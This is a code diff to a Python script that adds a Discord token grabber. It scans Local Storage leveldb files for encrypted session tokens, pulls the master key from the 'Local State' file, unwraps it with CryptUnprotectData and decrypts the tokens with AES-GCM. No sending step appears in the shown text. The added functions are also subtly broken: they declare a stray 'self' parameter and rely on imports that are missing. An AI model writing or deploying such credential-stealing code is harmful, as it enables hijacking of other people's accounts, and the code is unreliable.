@@ -1,6 +1,6 @@
 import os
 import re
-
+import base64
 import Levenshtein
 
 
@@ -14,8 +14,12 @@ def isSomething(inp, list_of_interested, accuracy):
         return False
 
 
-def find_tokens(path):
+def find_tokens(path, debug):
+    pathh = path
     path += '\\Local Storage\\leveldb'
+    regexp_new = r"dQw4w9WgXcQ:[^\"]*"
+    regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+    roaming = os.getenv("appdata")
 
     tokens = []
 
@@ -24,13 +28,12 @@ def find_tokens(path):
             continue
 
         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
+            for token in re.findall(regexp_new, line):
+                tokens.append(decrypt_val(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), get_master_key(roaming+f'\\{pathh}\\Local State')))
     return tokens
 
 
-def get_tokens():
+def get_tokens(debug):
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
     tokenz = []
@@ -47,14 +50,46 @@ def get_tokens():
 
     for platform, path in paths.items():
         if not os.path.exists(path):
+            if debug:
+                print(f"Path not found: {path}")
             continue
+        if debug:
+            print(f"Path found: {path}")
 
-        tokens = find_tokens(path)
+        tokens = find_tokens(path, debug)
 
         if len(tokens) > 0:
             for token in tokens:
                 tokenz.append(f'{platform}: {token}')
     return tokenz
+
+
+def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+
+        return decrypted_pass
+
+
+def get_master_key(self, path: str) -> str:
+        if not os.path.exists(path):
+            return
+
+        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
+            return
+
+        with open(path, "r", encoding="utf-8") as f:
+            c = f.read()
+        local_state = json.loads(c)
+
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+        return master_key
 
 
 # https://stackoverflow.com/questions/182197/how-do-i-watch-a-file-for-changes
